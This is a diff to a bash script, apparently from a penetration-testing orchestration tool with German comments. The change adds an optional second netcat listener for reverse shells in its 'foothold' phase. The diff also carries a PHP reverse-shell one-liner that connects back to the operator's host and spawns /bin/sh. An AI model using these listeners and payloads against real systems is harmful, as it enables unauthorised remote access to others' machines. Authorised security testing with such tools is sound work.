@@ -9,8 +9,15 @@ phase_foothold() {
   local lport="${ENGAGE_LPORT:-4444}"
   local sid="p2s-$ENGAGE_SID"
 
-  term_spawn_jobs "$sid" "$ENGAGE_DIR/logs" \
+  local jobs=(
     "listener|echo '[listener] warte auf Rückkanal auf $lhost:$lport'; nc -lvnp $lport"
+  )
+  if [[ "${ENGAGE_RS:-}" == "on" ]]; then
+    local rsport="${ENGAGE_RS_PORT:-4445}"
+    jobs+=("rs-listener-$rsport|echo '[rs] lukechilds-Varianten — Listener $rsport'; nc -lvnp $rsport")
+    state_set 40 RS_PORT "$rsport"
+  fi
+  term_spawn_jobs "$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"
 
   state_set 40 LISTEN_HOST "$lhost"
   state_set 40 LISTEN_PORT "$lport"
@@ -25,5 +32,6 @@ Payload für den Exploit-Kanal (Beispiele, auf Ziel-OS anpassen):
   php:   php -r '\$s=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 Varianten-Generator (Repo): reverse_shell via tools — siehe pentest-kb / lukechilds-Pfad.
+Menü: [e] → [7] Reverse-Shell-Varianten (Payload-Beispiele + weiterer Listener).
 EOF
 }
